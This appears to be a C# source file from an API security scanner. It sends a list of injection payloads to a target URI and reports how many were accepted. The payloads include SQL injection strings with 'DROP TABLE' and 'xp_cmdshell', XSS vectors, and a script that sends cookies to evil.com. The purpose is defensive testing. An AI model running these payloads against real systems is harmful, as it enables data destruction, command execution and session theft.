namespace API_Tester;

public partial class MainPage
{
    /*
    Application Security Test Runner

    Purpose:
    Executes a suite of automated security tests against the application 
    hosted at the specified base URI to identify potential vulnerabilities.

    Threat Model:
    Applications may be targeted by attackers seeking to exploit:

        - Insecure authentication and session management
        - Exposure of sensitive data (PII, credentials, tokens)
        - Injection attacks via user inputs or API parameters
        - Misconfigured access controls or permissions
        - Security header and encryption misconfigurations

    Test Strategy:
    The method performs asynchronous checks including:

        - Inspecting API responses for exposed sensitive data
        - Attempting to bypass authentication or session controls
        - Simulating injection and other common attack vectors
        - Verifying enforcement of security policies and headers

    Potential Impact:
    If vulnerabilities are present, attackers may be able to:

        - Access or modify sensitive user or system data
        - Hijack sessions or accounts
        - Escalate privileges within the application
        - Discover internal system structure or logic

    Expected Behavior:
    Applications should:

        - Protect all sensitive information with encryption and proper access controls
        - Enforce secure authentication and session management
        - Validate and sanitize inputs to prevent injections
        - Limit data exposure and follow the principle of least privilege
        - Return detailed security-related findings only to authorized users
    */

    private static string[] GetApplicationSecurityPayloads() =>
    [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "\" OR \"1\"=\"1\"--",
        "<script>alert(1)</script>",
        "'; DROP TABLE users; --",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<a href='javascript:alert(1)'>Click me</a>",
        "'); EXEC xp_cmdshell('dir'); --",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('XSS')>",
        "<script>fetch('http://evil.com?cookie=' + document.cookie)</script>",
        "' OR 1=1 --",
        "';--",
        "');--",
        ""
    ];

    private HttpRequestMessage FormatApplicationSecurityRequest(Uri baseUri, string payload)
    {
        var probeUri = AppendQuery(baseUri, new Dictionary<string, string>
        {
            ["input"] = payload,
            ["filter"] = payload
        });
        return new HttpRequestMessage(HttpMethod.Get, probeUri);
    }

    private async Task<string> RunApplicationSecurityTestsAsync(Uri baseUri)
    {
        var payloads = GetApplicationSecurityPayloads();
        var findings = new List<string>();
        var accepted = 0;

        foreach (var payload in payloads)
        {
            var response = await SafeSendAsync(() => FormatApplicationSecurityRequest(baseUri, payload));
            findings.Add($"Payload '{payload}': {FormatStatus(response)}");
            if (response is not null && (int)response.StatusCode is >= 200 and < 300)
            {
                accepted++;
            }
        }

        findings.Insert(0, $"Payload variants tested: {payloads.Length}");
        findings.Add(accepted > 1
            ? $"Potential risk: permissive handling observed on {accepted}/{payloads.Length} probes."
            : "No obvious input/injection handling weakness across tested payloads.");

        return FormatSection("CIS Application Security", baseUri, findings);
    }
}
